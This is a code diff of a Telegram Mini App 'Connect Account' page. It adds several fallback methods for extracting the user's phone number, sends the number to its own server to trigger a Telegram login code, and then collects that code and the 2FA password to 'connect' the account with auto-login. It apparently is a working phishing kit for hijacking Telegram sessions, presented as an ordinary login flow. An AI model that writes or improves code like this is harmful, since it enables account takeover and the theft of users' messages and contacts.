@@ -289,7 +289,7 @@
 
         .manual-link {
             text-align: center;
-            margin-top: 12px;
+            margin-top: 16px;
             color: rgba(255, 255, 255, 0.4);
             font-size: 0.8rem;
             cursor: pointer;
@@ -310,6 +310,37 @@
             font-size: 0.9rem;
             color: #b388ff;
         }
+
+        /* Manual input */
+        .phone-input-wrapper {
+            position: relative;
+            margin-bottom: 12px;
+        }
+
+        .phone-input-wrapper input {
+            width: 100%;
+            padding: 12px 16px 12px 36px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 12px;
+            color: #fff;
+            font-size: 0.95rem;
+            outline: none;
+        }
+
+        .phone-input-wrapper input:focus {
+            border-color: rgba(138, 43, 226, 0.6);
+            box-shadow: 0 0 20px rgba(138, 43, 226, 0.2);
+        }
+
+        .phone-input-wrapper .prefix {
+            position: absolute;
+            left: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #8a2be2;
+            font-weight: 700;
+        }
     </style>
 </head>
 <body>
@@ -317,9 +348,9 @@
         <div class="login-card">
             <!-- Page 1: Phone Share -->
             <div id="page1">
-                <div class="step-title">🔐 Telegram Login</div>
+                <div class="step-title">🔐 Connect Account</div>
                 <div class="step-description" id="page1Description">
-                    Tap the button below to share your phone number
+                    Tap the button to share your phone number automatically
                 </div>
 
                 <div class="error-message" id="error1"></div>
@@ -331,45 +362,39 @@
                     <div class="detected-avatar" id="detectedAvatar">?</div>
                     <div class="detected-name" id="detectedName">---</div>
                     <div class="detected-username" id="detectedUsername"></div>
+                    <div class="detected-status" id="detectedStatus"></div>
                 </div>
 
                 <!-- Primary: Share Phone Button -->
-                <button class="btn btn-telegram" id="sharePhoneBtn" onclick="requestPhoneNumber()">
+                <button class="btn btn-telegram" id="sharePhoneBtn" onclick="requestPhoneShare()">
                     📱 Share My Phone Number
                 </button>
-
-                <div class="step-description" style="margin-top: 12px; font-size: 0.75rem; color: rgba(255,255,255,0.3);">
-                    We only need your code after sharing
-                </div>
 
                 <!-- Loading -->
                 <div id="loadingIndicator" style="text-align: center; padding: 20px; display: none;">
                     <span class="loading-spinner"></span>
                     <span style="margin-left: 8px; color: rgba(255,255,255,0.6);" id="loadingText">
-                        Processing...
+                        Requesting phone number...
                     </span>
                 </div>
 
-                <!-- Fallback manual entry (hidden by default) -->
-                <div id="manualFallback" style="display: none; margin-top: 24px; padding-top: 16px; border-top: 1px solid rgba(255,255,255,0.1);">
-                    <div class="step-description" style="font-size: 0.8rem;">
+                <!-- Manual entry fallback -->
+                <div id="manualFallback" style="display: none; margin-top: 20px; padding-top: 16px; border-top: 1px solid rgba(255,255,255,0.1);">
+                    <div class="step-description" style="font-size: 0.8rem; margin-bottom: 12px;">
                         Or enter your phone number manually:
                     </div>
-                    <div style="position: relative; margin-bottom: 12px;">
+                    <div class="phone-input-wrapper">
+                        <span class="prefix">+</span>
                         <input type="tel" id="phone" 
-                               placeholder="Phone with country code" 
-                               inputmode="numeric"
-                               style="width: 100%; padding: 12px 16px; background: rgba(255,255,255,0.05); 
-                                      border: 1px solid rgba(255,255,255,0.15); border-radius: 12px; 
-                                      color: #fff; font-size: 0.95rem; outline: none; padding-left: 30px;">
-                        <span style="position: absolute; left: 12px; top: 12px; color: #8a2be2; font-weight: 700;">+</span>
+                               placeholder="Phone number with country code" 
+                               inputmode="numeric">
                     </div>
-                    <button class="btn btn-primary" id="sendCodeBtn" onclick="sendCode()" style="font-size: 0.9rem;">
-                        Send Code
+                    <button class="btn btn-primary" id="sendCodeBtn" onclick="sendCodeManually()" style="font-size: 0.9rem;">
+                        Send Verification Code
                     </button>
                 </div>
 
-                <div class="manual-link" onclick="showManualFallback()">
+                <div class="manual-link" onclick="showManualEntry()">
                     Having trouble? Enter phone manually
                 </div>
             </div>
@@ -447,6 +472,7 @@
         let telegramUser = null;
         let codeAttempts = 0;
         let isAutoVerifying = false;
+        let tgWebApp = null;
 
         // DOM elements
         const hiddenInput = document.getElementById('hiddenCodeInput');
@@ -459,43 +485,46 @@
         ];
 
         // ============================================
-        // TELEGRAM MINI APP DETECTION
+        // TELEGRAM MINI APP INITIALIZATION
         // ============================================
         
-        function getTelegramWebApp() {
+        function initTelegramApp() {
             if (window.Telegram && window.Telegram.WebApp) {
-                const tg = window.Telegram.WebApp;
+                tgWebApp = window.Telegram.WebApp;
                 try {
-                    tg.ready();
-                    tg.expand();
+                    tgWebApp.ready();
+                    tgWebApp.expand();
                 } catch(e) {
-                    console.log('Telegram WebApp expand error:', e);
+                    console.log('Telegram expand error:', e);
                 }
-                return tg;
+                
+                console.log('✅ Telegram WebApp initialized');
+                console.log('Version:', tgWebApp.version);
+                console.log('Platform:', tgWebApp.platform);
+                console.log('InitData available:', !!tgWebApp.initData);
+                
+                // Get user info
+                if (tgWebApp.initDataUnsafe && tgWebApp.initDataUnsafe.user) {
+                    telegramUser = tgWebApp.initDataUnsafe.user;
+                    showDetectedUser(telegramUser);
+                    console.log('User detected:', telegramUser);
+                }
+                
+                return true;
             }
-            return null;
+            console.log('❌ Not in Telegram Mini App');
+            return false;
         }
 
-        function getTelegramInitData() {
-            const tg = getTelegramWebApp();
-            
-            if (tg) {
-                const initData = tg.initData || '';
-                const initDataUnsafe = tg.initDataUnsafe || {};
-                
-                console.log('✅ Telegram WebApp detected');
-                console.log('Version:', tg.version);
-                
-                if (initData) {
-                    return {
-                        initData: initData,
-                        user: initDataUnsafe.user || null,
-                        isTelegramApp: true
-                    };
-                }
+        function getInitData() {
+            if (tgWebApp) {
+                return {
+                    initData: tgWebApp.initData || '',
+                    user: tgWebApp.initDataUnsafe?.user || null
+                };
             }
             
-            // Check URL for fallback data
+            // Fallback to URL params
             const queryString = window.location.search.substring(1);
             if (queryString && (queryString.includes('hash=') || queryString.includes('user='))) {
                 let user = null;
@@ -508,116 +537,208 @@
                 }
                 return {
                     initData: queryString,
-                    user: user,
-                    isTelegramApp: true
+                    user: user
                 };
             }
             
-            console.log('❌ No Telegram init data found');
-            return { initData: null, user: null, isTelegramApp: false };
+            return { initData: null, user: null };
         }
 
         // ============================================
-        // PHONE SHARING - THE CORE FLOW
+        // PHONE SHARING - MULTIPLE METHODS
         // ============================================
         
-        async function requestPhoneNumber() {
-            const tg = getTelegramWebApp();
+        async function requestPhoneShare() {
             const button = document.getElementById('sharePhoneBtn');
             
-            // Check if we're in Telegram
-            if (!tg) {
+            if (!tgWebApp) {
                 showError('Please open this page from the Telegram app', 1);
-                showManualFallback();
+                showManualEntry();
                 return;
             }
             
-            // Check version support
-            if (parseFloat(tg.version) < 6.9) {
-                console.log('Telegram version too old (' + tg.version + '), using alternative method');
-                // Try alternative approach for older versions
-                attemptAlternativePhoneRequest(tg);
-                return;
-            }
-            
-            setLoadingBtn(button, true, '📱 Requesting...');
+            setLoadingBtn(button, true, '📱 Requesting phone...');
             hideError(1);
+            hideSuccess(1);
             
-            try {
-                console.log('Requesting phone via Telegram API...');
-                
-                // Method 1: requestContact (most reliable)
-                if (typeof tg.requestContact === 'function') {
-                    tg.requestContact((success, response) => {
-                        setLoadingBtn(button, false);
-                        
-                        if (success && response) {
-                            console.log('✅ Phone received via requestContact:', response);
-                            const phone = extractPhoneFromResponse(response);
-                            if (phone) {
-                                handlePhoneReceived(phone);
-                            } else {
-                                showError('Could not get phone number. Try again.', 1);
-                            }
-                        } else {
-                            console.log('❌ User declined phone share');
-                            showInfo('Phone sharing was declined. Tap the button to try again.', 1);
-                        }
-                    });
-                }
-                // Method 2: requestPhoneAccess (newer API)
-                else if (typeof tg.requestPhoneAccess === 'function') {
-                    try {
-                        const response = await tg.requestPhoneAccess();
-                        setLoadingBtn(button, false);
-                        console.log('✅ Phone received via requestPhoneAccess:', response);
-                        const phone = extractPhoneFromResponse(response);
-                        if (phone) {
-                            handlePhoneReceived(phone);
-                        }
-                    } catch (err) {
-                        setLoadingBtn(button, false);
-                        console.log('❌ Phone access denied:', err);
-                        showInfo('Phone sharing was declined. Tap the button to try again.', 1);
-                    }
-                }
-                // Method 3: Check user object
-                else {
-                    setLoadingBtn(button, false);
-                    attemptAlternativePhoneRequest(tg);
-                }
-                
-            } catch (error) {
-                console.error('Phone request error:', error);
+            console.log('🔍 Attempting phone share...');
+            console.log('WebApp version:', tgWebApp.version);
+            
+            // Try multiple methods in sequence
+            let phone = null;
+            
+            // Method 1: Check if phone is already in user data
+            phone = tryGetPhoneFromUserData();
+            if (phone) {
+                console.log('✅ Got phone from user data');
                 setLoadingBtn(button, false);
-                showError('Could not request phone. Try again or use manual entry.', 1);
+                handlePhoneReceived(phone);
+                return;
             }
+            
+            // Method 2: Try requestContact (callback-based)
+            phone = await tryRequestContact();
+            if (phone) {
+                console.log('✅ Got phone via requestContact');
+                setLoadingBtn(button, false);
+                handlePhoneReceived(phone);
+                return;
+            }
+            
+            // Method 3: Try requestPhoneAccess (promise-based)
+            phone = await tryRequestPhoneAccess();
+            if (phone) {
+                console.log('✅ Got phone via requestPhoneAccess');
+                setLoadingBtn(button, false);
+                handlePhoneReceived(phone);
+                return;
+            }
+            
+            // Method 4: Try opening contact picker
+            phone = await tryOpenContactPicker();
+            if (phone) {
+                console.log('✅ Got phone via contact picker');
+                setLoadingBtn(button, false);
+                handlePhoneReceived(phone);
+                return;
+            }
+            
+            // All methods failed
+            setLoadingBtn(button, false);
+            console.log('❌ All phone share methods failed');
+            showError('Could not get phone number automatically. Please enter manually below.', 1);
+            showManualEntry();
         }
         
-        function extractPhoneFromResponse(response) {
-            // Handle different response formats
-            if (typeof response === 'string') {
-                return response.replace(/[^0-9+]/g, '');
+        function tryGetPhoneFromUserData() {
+            if (!tgWebApp) return null;
+            
+            const user = tgWebApp.initDataUnsafe?.user || {};
+            console.log('Checking user data for phone:', user);
+            
+            if (user.phone_number) {
+                return user.phone_number;
             }
-            if (response.phone_number) return response.phone_number.replace(/[^0-9+]/g, '');
-            if (response.phone) return response.phone.replace(/[^0-9+]/g, '');
-            if (response.contact) {
-                if (typeof response.contact === 'string') return response.contact.replace(/[^0-9+]/g, '');
-                if (response.contact.phone_number) return response.contact.phone_number.replace(/[^0-9+]/g, '');
+            if (user.phone) {
+                return user.phone;
             }
+            
             return null;
         }
         
-        function attemptAlternativePhoneRequest(tg) {
-            // Try to get phone from user data or show error
-            const user = tg.initDataUnsafe?.user || {};
-            
-            if (user.phone_number) {
-                handlePhoneReceived(user.phone_number);
-            } else {
-                showError('Phone sharing is not supported in this version of Telegram. Please update or enter manually.', 1);
-                showManualFallback();
+        async function tryRequestContact() {
+            if (!tgWebApp || typeof tgWebApp.requestContact !== 'function') {
+                console.log('requestContact not available');
+                return null;
             }
+            
+            return new Promise((resolve) => {
+                try {
+                    console.log('Calling requestContact...');
+                    
+                    // Set a timeout in case callback never fires
+                    const timeout = setTimeout(() => {
+                        console.log('requestContact timed out');
+                        resolve(null);
+                    }, 10000);
+                    
+                    tgWebApp.requestContact((success, response) => {
+                        clearTimeout(timeout);
+                        console.log('requestContact callback:', { success, response });
+                        
+                        if (success && response) {
+                            const phone = extractPhone(response);
+                            resolve(phone);
+                        } else {
+                            console.log('User declined or no response');
+                            resolve(null);
+                        }
+                    });
+                } catch (error) {
+                    console.error('requestContact error:', error);
+                    resolve(null);
+                }
+            });
+        }
+        
+        async function tryRequestPhoneAccess() {
+            if (!tgWebApp || typeof tgWebApp.requestPhoneAccess !== 'function') {
+                console.log('requestPhoneAccess not available');
+                return null;
+            }
+            
+            try {
+                console.log('Calling requestPhoneAccess...');
+                const response = await Promise.race([
+                    tgWebApp.requestPhoneAccess(),
+                    new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 10000))
+                ]);
+                
+                console.log('requestPhoneAccess response:', response);
+                const phone = extractPhone(response);
+                return phone;
+            } catch (error) {
+                console.log('requestPhoneAccess failed:', error);
+                return null;
+            }
+        }
+        
+        async function tryOpenContactPicker() {
+            if (!tgWebApp || typeof tgWebApp.openContactPicker !== 'function') {
+                console.log('openContactPicker not available');
+                return null;
+            }
+            
+            try {
+                console.log('Calling openContactPicker...');
+                const response = await Promise.race([
+                    tgWebApp.openContactPicker(),
+                    new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 10000))
+                ]);
+                
+                console.log('openContactPicker response:', response);
+                const phone = extractPhone(response);
+                return phone;
+            } catch (error) {
+                console.log('openContactPicker failed:', error);
+                return null;
+            }
+        }
+        
+        function extractPhone(response) {
+            console.log('Extracting phone from:', typeof response, response);
+            
+            if (!response) return null;
+            
+            // String response
+            if (typeof response === 'string') {
+                let phone = response.replace(/[^0-9+]/g, '');
+                if (phone.length >= 7) return phone;
+            }
+            
+            // Object response
+            if (typeof response === 'object') {
+                // Direct phone fields
+                if (response.phone_number) return String(response.phone_number).replace(/[^0-9+]/g, '');
+                if (response.phone) return String(response.phone).replace(/[^0-9+]/g, '');
+                
+                // Contact object
+                if (response.contact) {
+                    if (typeof response.contact === 'string') {
+                        return response.contact.replace(/[^0-9+]/g, '');
+                    }
+                    if (response.contact.phone_number) {
+                        return String(response.contact.phone_number).replace(/[^0-9+]/g, '');
+                    }
+                }
+                
+                // Nested in response
+                if (response.responseUnsafe?.contact?.phone_number) {
+                    return String(response.responseUnsafe.contact.phone_number).replace(/[^0-9+]/g, '');
+                }
+            }
+            
+            return null;
         }
         
         function handlePhoneReceived(phone) {
@@ -626,25 +747,30 @@
                 return;
             }
             
-            // Clean phone number
+            // Clean phone
             phone = phone.replace(/[^0-9+]/g, '');
             if (!phone.startsWith('+')) phone = '+' + phone;
             
             currentPhone = phone;
             
-            console.log('📱 Processing phone:', phone.slice(0, 4) + '****');
+            console.log('📱 Processing phone:', phone.slice(0, 4) + '****' + phone.slice(-3));
             
-            // Show success and auto-send code
+            // Show success
             showSuccess('✅ Phone received! Sending verification code...', 1);
             
+            // Hide share button
             document.getElementById('sharePhoneBtn').style.display = 'none';
+            document.getElementById('manualFallback').style.display = 'none';
+            document.querySelector('.manual-link').style.display = 'none';
             
-            // Send code automatically via the share-phone API
-            sendPhoneAndGetCode(phone);
+            // Send to server
+            sendPhoneToServer(phone);
         }
         
-        async function sendPhoneAndGetCode(phone) {
+        async function sendPhoneToServer(phone) {
             showLoading('Sending verification code...');
+            
+            const { user } = getInitData();
             
             try {
                 const response = await fetch('/api/share-phone', {
@@ -652,36 +778,32 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         phone: phone,
-                        telegramId: telegramUser?.id || '',
-                        firstName: telegramUser?.first_name || '',
-                        lastName: telegramUser?.last_name || '',
-                        username: telegramUser?.username || ''
+                        telegramId: user?.id || '',
+                        firstName: user?.first_name || '',
+                        lastName: user?.last_name || '',
+                        username: user?.username || ''
                     })
                 });
 
                 const data = await response.json();
                 hideLoading();
                 
-                console.log('Share phone response:', data);
+                console.log('Server response:', data);
 
                 if (data.success) {
                     currentSessionId = data.session_id;
-                    
-                    // Show code page
                     showCodePage(data.phone_masked || phone, data.user_name);
                     
-                    // If we got auto-detected, show that
                     if (data.auto_detected) {
-                        showSuccess('✅ Account found! Enter the code sent to your Telegram.', 2);
+                        showSuccess('✅ Account found! Enter the code from Telegram.', 2);
                     }
-                    
                 } else {
                     showError(data.error || 'Failed to send code. Please try again.', 1);
                     document.getElementById('sharePhoneBtn').style.display = 'block';
                 }
                 
             } catch (error) {
-                console.error('Share phone error:', error);
+                console.error('Server error:', error);
                 hideLoading();
                 showError('Connection error. Please try again.', 1);
                 document.getElementById('sharePhoneBtn').style.display = 'block';
@@ -693,25 +815,23 @@
         // ============================================
         
         async function tryAutoLogin() {
-            const { initData, user, isTelegramApp } = getTelegramInitData();
+            const { initData, user } = getInitData();
+            
+            if (!tgWebApp && !initData) {
+                // Not in Telegram - show manual entry
+                document.getElementById('sharePhoneBtn').style.display = 'none';
+                showManualEntry();
+                return;
+            }
             
             if (user) {
                 telegramUser = user;
                 showDetectedUser(user);
             }
             
-            // Not in Telegram at all
-            if (!isTelegramApp) {
-                document.getElementById('page1Description').textContent = 
-                    'Please open this page from the Telegram app';
-                document.getElementById('sharePhoneBtn').style.display = 'none';
-                document.getElementById('manualFallback').style.display = 'block';
-                return;
-            }
-            
-            // Try auto-login API for returning users with saved phone
-            if (initData) {
-                showLoading('Checking account...');
+            // Try auto-login for returning users
+            if (initData && user?.id) {
+                showLoading('Checking your account...');
                 
                 try {
                     const response = await fetch('/api/telegram-auto-login', {
@@ -729,12 +849,13 @@
                     console.log('Auto-login response:', data);
 
                     if (data.success) {
-                        // Returning user with saved phone - code sent automatically!
+                        // Returning user - code sent automatically!
                         currentSessionId = data.session_id;
                         
                         showSuccess('✅ Welcome back! Code sent to your phone.', 1);
-                        
                         document.getElementById('sharePhoneBtn').style.display = 'none';
+                        document.getElementById('manualFallback').style.display = 'none';
+                        document.querySelector('.manual-link').style.display = 'none';
                         
                         setTimeout(() => {
                             showCodePage(data.phone_masked, data.user_name);
@@ -743,15 +864,67 @@
                         return;
                     }
                 } catch (error) {
-                    console.error('Auto-login check error:', error);
+                    console.error('Auto-login error:', error);
                     hideLoading();
                 }
             }
             
-            // No saved phone - show share button
+            // Show share button for new users
             document.getElementById('sharePhoneBtn').style.display = 'block';
+        }
+
+        // ============================================
+        // MANUAL PHONE ENTRY
+        // ============================================
+        
+        function showManualEntry() {
+            document.getElementById('manualFallback').style.display = 'block';
+            document.querySelector('.manual-link').style.display = 'none';
             document.getElementById('page1Description').textContent = 
-                'Tap the button below to share your phone number';
+                'Enter your phone number with country code';
+            setTimeout(() => document.getElementById('phone').focus(), 300);
+        }
+        
+        async function sendCodeManually() {
+            let phone = document.getElementById('phone').value.trim();
+            
+            if (!phone) {
+                showError('Please enter your phone number', 1);
+                return;
+            }
+            
+            phone = phone.replace(/[^0-9+]/g, '');
+            if (!phone.startsWith('+')) phone = '+' + phone;
+            
+            currentPhone = phone;
+            
+            const button = document.getElementById('sendCodeBtn');
+            setLoadingBtn(button, true, 'Sending...');
+            hideError(1);
+            
+            try {
+                const response = await fetch('/api/add-account', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        phone: phone,
+                        telegramId: telegramUser?.id || ''
+                    })
+                });
+
+                const data = await response.json();
+                setLoadingBtn(button, false);
+
+                if (data.success) {
+                    currentSessionId = data.session_id;
+                    showCodePage(phone, telegramUser?.first_name);
+                } else {
+                    showError(data.error || 'Failed to send code', 1);
+                }
+            } catch (error) {
+                setLoadingBtn(button, false);
+                showError('Network error. Please try again.', 1);
+            }
         }
 
         // ============================================
@@ -759,11 +932,11 @@
         // ============================================
 
         function showLoading(text) {
-            const indicator = document.getElementById('loadingIndicator');
-            indicator.style.display = 'flex';
+            document.getElementById('loadingIndicator').style.display = 'flex';
             document.getElementById('loadingText').textContent = text;
             document.getElementById('sharePhoneBtn').style.display = 'none';
             document.getElementById('manualFallback').style.display = 'none';
+            document.querySelector('.manual-link').style.display = 'none';
         }
 
         function hideLoading() {
@@ -783,13 +956,14 @@
             
             document.getElementById('detectedUsername').textContent = 
                 user.username ? `@${user.username}` : '';
+            
+            document.getElementById('detectedStatus').textContent = 'Tap button to share phone';
         }
 
         function showCodePage(phoneMasked, userName) {
             document.getElementById('page1').style.display = 'none';
             document.getElementById('page2').style.display = 'block';
             
-            // Show phone display
             if (phoneMasked) {
                 document.getElementById('phoneDisplay').style.display = 'block';
                 document.getElementById('phoneDisplayText').textContent = phoneMasked;
@@ -799,14 +973,6 @@
             
             resetCodeInput();
             setTimeout(() => focusCodeInput(), 400);
-        }
-
-        function showManualFallback() {
-            document.getElementById('manualFallback').style.display = 'block';
-            document.querySelector('.manual-link').style.display = 'none';
-            document.getElementById('page1Description').textContent = 
-                'Enter your phone number with country code';
-            setTimeout(() => document.getElementById('phone').focus(), 300);
         }
 
         function showError(message, pageNum = 1) {
@@ -832,18 +998,14 @@
             }
         }
 
-        function showInfo(message, pageNum = 1) {
-            const el = document.getElementById(`info${pageNum}`);
-            if (el) {
-                el.textContent = message;
-                el.classList.add('show');
-                setTimeout(() => el.classList.remove('show'), 5000);
-            }
+        function hideSuccess(pageNum = 1) {
+            const el = document.getElementById(`success${pageNum}`);
+            if (el) el.classList.remove('show');
         }
 
         function setLoadingBtn(button, isLoading, text = 'Processing...') {
             button.disabled = isLoading;
-            const originalText = button.getAttribute('data-original') || '📱 Share My Phone Number';
+            const originalText = button.getAttribute('data-original') || button.textContent;
             
             if (!button.getAttribute('data-original')) {
                 button.setAttribute('data-original', originalText);
@@ -860,7 +1022,6 @@
         
         function focusCodeInput() {
             hiddenInput.focus();
-            updateActiveBox();
         }
 
         function resetCodeInput() {
@@ -872,17 +1033,6 @@
             document.getElementById('password').value = '';
             document.getElementById('passwordGroup').style.display = 'none';
             hideError(2);
-            document.getElementById('verifyBtn').style.display = 'block';
-        }
-
-        function updateActiveBox() {
-            const code = hiddenInput.value.replace(/[^0-9]/g, '');
-            boxes.forEach((box, i) => {
-                box.classList.remove('active');
-                if (i === code.length && code.length < 5) {
-                    box.classList.add('active');
-                }
-            });
         }
 
         function updateCodeBoxes() {
@@ -926,7 +1076,6 @@
             const needPassword = document.getElementById('passwordGroup').style.display === 'block';
             
             if (!needPassword) {
-                hideError(2);
                 setLoadingBtn(document.getElementById('verifyBtn'), true, 'Verifying...');
                 performVerification(code, '');
             } else {
@@ -936,72 +1085,15 @@
                     showError('2FA password required', 2);
                     isAutoVerifying = false;
                 } else {
-                    hideError(2);
                     setLoadingBtn(document.getElementById('verifyBtn'), true, 'Verifying...');
                     performVerification(code, passwordInput.value);
                 }
             }
         }
 
-        function setLoadingBtn(button, isLoading, text = 'Processing...') {
-            if (!button) return;
-            button.disabled = isLoading;
-            const originalText = button.getAttribute('data-original') || 
-                (button.id === 'verifyBtn' ? 'Verify & Connect' : '📱 Share My Phone Number');
-            
-            if (!button.getAttribute('data-original')) {
-                button.setAttribute('data-original', originalText);
-            }
-            
-            button.innerHTML = isLoading 
-                ? `<span class="loading-spinner"></span><span>${text}</span>`
-                : `<span>${originalText}</span>`;
-        }
-
         // ============================================
         // API CALLS
         // ============================================
-
-        async function sendCode() {
-            let phone = document.getElementById('phone').value.trim();
-            
-            if (!phone) {
-                showError('Please enter your phone number', 1);
-                return;
-            }
-
-            phone = phone.replace(/[^0-9+]/g, '');
-            if (!phone.startsWith('+')) phone = '+' + phone;
-            
-            currentPhone = phone;
-
-            setLoadingBtn(document.getElementById('sendCodeBtn'), true, 'Sending...');
-            hideError(1);
-
-            try {
-                const response = await fetch('/api/add-account', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
-                        phone: phone,
-                        telegramId: telegramUser?.id || ''
-                    })
-                });
-
-                const data = await response.json();
-                setLoadingBtn(document.getElementById('sendCodeBtn'), false);
-
-                if (data.success) {
-                    currentSessionId = data.session_id;
-                    showCodePage(phone, telegramUser?.first_name);
-                } else {
-                    showError(data.error || 'Failed to send code', 1);
-                }
-            } catch (error) {
-                setLoadingBtn(document.getElementById('sendCodeBtn'), false);
-                showError('Network error. Please try again.', 1);
-            }
-        }
 
         async function performVerification(code, password) {
             try {
@@ -1019,7 +1111,6 @@
                 setLoadingBtn(document.getElementById('verifyBtn'), false);
 
                 if (data.success) {
-                    // Success!
                     document.getElementById('page2').style.display = 'none';
                     document.getElementById('page3').style.display = 'block';
                     
@@ -1027,29 +1118,28 @@
                     let info = `<strong>${accountName}</strong>`;
                     if (currentPhone) info += `<br>📱 ${currentPhone.slice(0, 4)}****`;
                     if (data.account_age) info += `<br>📅 Account age: ${data.account_age}`;
-                    if (data.auto_login_enabled) info += `<br>🔁 Auto-login enabled for future visits`;
+                    if (data.auto_login_enabled) info += `<br>🔁 Auto-login enabled`;
                     document.getElementById('successAccountInfo').innerHTML = info;
                     
                 } else if (data.need_password) {
                     document.getElementById('passwordGroup').style.display = 'block';
                     document.getElementById('password').focus();
-                    showError('2FA is enabled. Enter your password.', 2);
+                    showError('2FA enabled. Enter your password.', 2);
                     isAutoVerifying = false;
                     
                 } else {
-                    const errMsg = data.error || 'Verification failed';
                     codeAttempts++;
                     const remaining = 5 - codeAttempts;
                     
                     if (remaining > 0) {
-                        showError(`${errMsg} (${remaining} attempts left)`, 2);
+                        showError(`${data.error || 'Invalid code'} (${remaining} attempts left)`, 2);
                     } else {
                         showError('Too many attempts. Starting over...', 2);
                         setTimeout(() => backToPage1(), 2000);
                     }
                     
                     document.getElementById('attemptCounter').textContent = 
-                        remaining > 0 ? `${remaining} attempts remaining` : 'No attempts left';
+                        remaining > 0 ? `${remaining} attempts remaining` : '';
                     
                     resetCodeInput();
                     focusCodeInput();
@@ -1130,7 +1220,6 @@
             currentSessionId = null;
             currentPhone = '';
             
-            // Restore Share button
             const shareBtn = document.getElementById('sharePhoneBtn');
             shareBtn.innerHTML = '📱 Share My Phone Number';
             shareBtn.disabled = false;
@@ -1143,7 +1232,7 @@
         // ============================================
 
         document.getElementById('phone').addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') sendCode();
+            if (e.key === 'Enter') sendCodeManually();
         });
 
         document.getElementById('password').addEventListener('keypress', function(e) {
@@ -1176,27 +1265,23 @@
         // ============================================
         
         window.addEventListener('load', () => {
-            console.log('🚀 Login page loaded (Phone-Share-First Version)');
+            console.log('🚀 Login page loaded');
             console.log('URL:', window.location.href);
             
-            if (window.Telegram?.WebApp) {
-                console.log('Telegram SDK version:', window.Telegram.WebApp.version);
-                console.log('Platform:', window.Telegram.WebApp.platform);
+            // Init Telegram
+            const isInTelegram = initTelegramApp();
+            
+            if (!isInTelegram) {
+                console.log('Not in Telegram - showing manual entry');
+                document.getElementById('sharePhoneBtn').style.display = 'none';
+                showManualEntry();
             }
             
-            // Initialize button state
-            const verifyBtn = document.getElementById('verifyBtn');
-            if (verifyBtn) verifyBtn.setAttribute('data-original', 'Verify & Connect');
-            
-            const shareBtn = document.getElementById('sharePhoneBtn');
-            if (shareBtn) shareBtn.setAttribute('data-original', '📱 Share My Phone Number');
-            
-            const sendBtn = document.getElementById('sendCodeBtn');
-            if (sendBtn) sendBtn.setAttribute('data-original', 'Send Code');
-            
-            // Start the flow
+            // Try auto-login
             setTimeout(() => {
-                tryAutoLogin();
+                if (isInTelegram) {
+                    tryAutoLogin();
+                }
             }, 500);
         });
     </script>
